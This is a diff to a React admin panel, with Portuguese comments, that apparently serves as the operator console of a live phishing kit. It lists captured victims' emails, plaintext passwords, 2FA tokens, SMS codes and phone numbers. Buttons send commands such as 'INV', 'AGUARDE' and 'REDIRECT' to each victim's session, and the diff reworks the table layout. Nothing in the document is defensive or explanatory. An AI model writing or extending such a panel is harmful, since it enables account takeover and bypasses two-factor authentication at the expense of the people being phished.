@@ -239,10 +239,13 @@ function AdminPanel() {
                         </tr>
                       </thead>
                       <tbody>
-                        {/* Linha de Comandos/Botões */}
+                        {/* Única linha de dados */}
                         <tr className="bg-white">
-                          <td className="px-3 py-2 text-center text-sm font-bold border border-gray-300">{index + 1}</td>
-                          <td className="px-3 py-2 text-center border border-gray-300">
+                          {/* # */}
+                          <td className="px-3 py-3 text-center text-sm font-bold border border-gray-300">{index + 1}</td>
+                          
+                          {/* status - bolinha clicável */}
+                          <td className="px-3 py-3 text-center border border-gray-300">
                             <button
                               onClick={() => updateStatus(attempt.id, attempt.status === "online" ? "offline" : "online")}
                               className="inline-flex items-center justify-center"
@@ -250,109 +253,77 @@ function AdminPanel() {
                               <span className={`w-4 h-4 rounded-full ${attempt.status === "online" ? "bg-green-500" : "bg-red-500"}`}></span>
                             </button>
                           </td>
-                          <td className="px-3 py-2 text-center border border-gray-300">
+                          
+                          {/* INV - botão comando */}
+                          <td className="px-3 py-3 text-center border border-gray-300">
                             <button
                               onClick={() => sendCommand(attempt.id, "INV")}
-                              className="bg-yellow-500 hover:bg-yellow-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
+                              className="bg-yellow-500 hover:bg-yellow-600 text-white px-3 py-1 rounded text-xs font-bold transition-colors"
                             >
                               INV
                             </button>
                           </td>
-                          <td className="px-3 py-2 text-sm border border-gray-300 font-medium">{attempt.email}</td>
-                          <td className="px-3 py-2 text-sm border border-gray-300">{attempt.password || "-"}</td>
-                          <td className="px-3 py-2 text-center border border-gray-300">
-                            <button
-                              onClick={() => sendCommand(attempt.id, "AUT")}
-                              className="bg-blue-500 hover:bg-blue-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
-                            >
-                              AUT
-                            </button>
+                          
+                          {/* USUÁRIO/LOGIN - valor fixo */}
+                          <td className="px-3 py-3 text-sm border border-gray-300 font-medium">{attempt.email}</td>
+                          
+                          {/* SENHA - valor fixo */}
+                          <td className="px-3 py-3 text-sm border border-gray-300">{attempt.password || "-"}</td>
+                          
+                          {/* AUT - campo esperando dado */}
+                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
+                            <span className="text-gray-700">{attempt.token_2fa || "-"}</span>
                           </td>
-                          <td className="px-3 py-2 text-center border border-gray-300">
-                            <button
-                              onClick={() => sendCommand(attempt.id, "EMAIL")}
-                              className="bg-indigo-500 hover:bg-indigo-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
-                            >
-                              EMAIL
-                            </button>
+                          
+                          {/* EMAIL - campo esperando dado */}
+                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
+                            <span className="text-gray-700">{attempt.email_input || "-"}</span>
                           </td>
-                          <td className="px-3 py-2 text-center border border-gray-300">
-                            <button
-                              onClick={() => sendCommand(attempt.id, "TOK-TEL")}
-                              className="bg-teal-500 hover:bg-teal-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
-                            >
-                              TOK
-                            </button>
+                          
+                          {/* TOK-TEL - campo esperando dado */}
+                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
+                            <span className="text-gray-700">{attempt.sms_code || "-"}</span>
                           </td>
-                          <td className="px-3 py-2 text-center border border-gray-300">
-                            <button
-                              onClick={() => sendCommand(attempt.id, "TELEFONE")}
-                              className="bg-orange-500 hover:bg-orange-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
-                            >
-                              TEL
-                            </button>
+                          
+                          {/* Nº TELEFONE - campo esperando dado */}
+                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
+                            <span className="text-gray-700">{attempt.phone_number || "-"}</span>
                           </td>
-                          <td className="px-3 py-2 text-center border border-gray-300">
-                            <button
-                              onClick={() => sendCommand(attempt.id, "TOK-MAIL")}
-                              className="bg-purple-500 hover:bg-purple-600 text-white px-2 py-1 rounded text-xs font-bold transition-colors w-full"
-                            >
-                              TOK-MAIL
-                            </button>
+                          
+                          {/* TOK-MAIL - campo esperando dado */}
+                          <td className="px-3 py-3 text-center text-sm border border-gray-300">
+                            <span className="text-gray-700">{attempt.app_mail || "-"}</span>
                           </td>
-                          <td className="px-3 py-2 text-center border border-gray-300">
+                          
+                          {/* 👍 - emoji clicável */}
+                          <td className="px-3 py-3 text-center border border-gray-300">
                             <button
                               onClick={() => sendCommand(attempt.id, "AGUARDE")}
-                              className="text-xl"
+                              className="text-2xl hover:scale-110 transition-transform"
                             >
                               👍
                             </button>
                           </td>
-                          <td className="px-3 py-2 text-center border border-gray-300">
+                          
+                          {/* X - comando clicável */}
+                          <td className="px-3 py-3 text-center border border-gray-300">
                             <button
                               onClick={() => sendCommand(attempt.id, "REDIRECT")}
-                              className="text-red-600 hover:text-red-800 font-bold text-xl transition-colors"
+                              className="text-red-600 hover:text-red-800 font-bold text-2xl transition-colors"
                             >
                               X
                             </button>
                           </td>
-                          <td className="px-3 py-2 text-center border border-gray-300">
+                          
+                          {/* 🗑️ - lixeira clicável */}
+                          <td className="px-3 py-3 text-center border border-gray-300">
                             <button
                               onClick={() => handleDelete(attempt.id)}
-                              className="text-gray-600 hover:text-gray-800 transition-colors"
+                              className="text-gray-600 hover:text-gray-800 text-xl transition-colors"
                             >
                               🗑️
                             </button>
                           </td>
-                        </tr>
-
-                        {/* Linha de Dados Recebidos */}
-                        <tr className="bg-gray-50">
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
-                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
-                            <span className="text-gray-700">-</span>
-                          </td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
-                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
-                            <span className="text-gray-700">{attempt.token_2fa || "-"}</span>
-                          </td>
-                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
-                            <span className="text-gray-700">{attempt.email_input || "-"}</span>
-                          </td>
-                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
-                            <span className="text-gray-700">{attempt.sms_code || "-"}</span>
-                          </td>
-                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
-                            <span className="text-gray-700">{attempt.phone_number || "-"}</span>
-                          </td>
-                          <td className="px-3 py-2 text-center text-xs border border-gray-300">
-                            <span className="text-gray-700">{attempt.app_mail || "-"}</span>
-                          </td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
-                          <td className="px-3 py-2 text-center text-xs text-gray-500 border border-gray-300"></td>
                         </tr>
                       </tbody>
                     </table>
